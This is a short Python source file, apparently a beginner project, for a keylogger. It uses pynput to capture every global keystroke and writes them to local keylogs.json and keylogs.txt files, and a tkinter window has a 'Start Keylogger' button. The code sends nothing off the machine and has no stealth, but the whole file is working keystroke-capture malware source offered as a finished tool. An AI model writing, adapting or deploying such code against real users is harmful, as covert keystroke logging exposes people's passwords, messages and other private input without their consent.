# Keylogger project that will capture keystrokes 
# and store them in two files one .json and one .txt
#making a GUI for the keylogger with a button to initiate it

from pynput import keyboard      #module containing keyboard classes and will be used to access the key related functions
import json                      #imported to be able to dump the keystrokes to a json file



list_of_keys = []              #[1] the key list to be appended to the json file 
pressed = True                 #[2] a variable which helps differentiate between the new key pressed or key held states, 
                               #it is initialised to True by default so that the first key detected is appended as being pressed
key_strokes = ""               #[3] a string variable that can be used to append the keystrokes to the .txt

#a function that is called to dump the keystrokes after encoding to a specified .json file
def update_json(list_of_keys):
    with open('keylogs.json', '+wb') as keylog_json:
        key_list = json.dumps(list_of_keys).encode()
        keylog_json.write(key_list)  

#a function that updates the .txt file with the keystrokes
def update_txt(key):
    with open('keylogs.txt','w+') as keylog_txt:
        keylog_txt.write(key)
    
def on_press(key):
    global pressed, list_of_keys, key_strokes

    if pressed == True:            #Pressed state
        list_of_keys.append({'Pressed': f'{key}'})
        pressed = False
          
    if pressed == False:            #Held state
        list_of_keys.append({'Held': f'{key}'})
        key_strokes = key_strokes + str(key)

    update_json(list_of_keys)       #calling function to write to the json file
    update_txt(str(key_strokes))    #calling to write to the txt file
    

def on_release(key):
    global pressed, list_of_keys, key_strokes

    list_of_keys.append({'Released': f'{key}'})
    if pressed == False:
        pressed = True                  #for next

    update_json(list_of_keys)

#function that gets executed when GUI button is pressed
def on_button_press():
    #printing message for successful working
    print("Keylogger is running successfully!! \n[*]Keystrokes are being saved to 'keylogs.json' and 'keylogs.txt'")

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
        

#creating GUI
import tkinter as tk

# Create the main application window
root = tk.Tk()
root.title("KEYLOGGER GUI")
root.geometry("400x300")  # Set the initial window size

# Set the background color to orange
root.configure(bg='orange')

# Create a frame to hold the content
frame = tk.Frame(root, bg='orange')
frame.pack(expand=True)


label = tk.Label(frame, text="Keylogger", bg='orange', font = 'Verdana 20 bold')
label.pack(pady=30, padx=50)  # Add some padding for centering

button = tk.Button(frame, text="Start Keylogger ?", font ='Verdana 12', command=on_button_press)
button.pack()

# Run the main event loop
root.mainloop()



                    
    




        








                    
    




        


